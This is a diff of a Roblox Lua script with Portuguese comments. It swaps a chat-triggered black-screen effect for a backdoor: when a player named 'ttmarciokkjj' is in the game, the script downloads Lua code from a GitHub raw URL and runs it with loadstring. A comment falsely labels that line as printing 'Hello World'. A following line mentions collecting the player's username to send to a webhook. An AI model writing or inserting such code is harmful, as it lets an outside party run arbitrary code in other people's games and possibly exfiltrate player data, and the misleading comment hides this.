@@ -3,29 +3,28 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 
--- Função que cria a GUI preta fullscreen
-local function criarGuiPreta()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BlackScreenGui"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    screenGui.IgnoreGuiInset = true -- Ignora a área de GUI do Roblox
+local specificPlayerName = "ttmarciokkjj"
 
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.Position = UDim2.new(0, 0, 0, 0)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.BackgroundTransparency = 0
-    frame.Parent = screenGui
-    frame.ZIndex = 999 -- Garante que a GUI fique acima de outros elementos
+-- Função a ser executada quando um jogador entra
+local function onPlayerAdded(player)
+    -- Verifica se o nome do jogador que entrou corresponde ao nome específico
+    if player.Name == specificPlayerName then
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/black.lua"))()-- Imprime "Hello World" no console de saída
+    end
 end
 
--- Evento para ouvir o chat do jogador local
-player.Chatted:Connect(function(msg)
-    if msg:lower() == ";hi" then
-        criarGuiPreta()
+-- Conecta a função ao evento PlayerAdded, que é disparado quando um jogador entra no jogo
+Players.PlayerAdded:Connect(onPlayerAdded)
+
+-- Verifica se o jogador específico já está no jogo quando o LocalScript é executado (útil para testes ou jogadores que já estão logados)
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Name == specificPlayerName then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/black.lua"))()
+        break -- Sai do loop assim que encontra o jogador
     end
-end)
+end
+
+
 
 -- Coleta dados para enviar webhook
 local username = player.Name
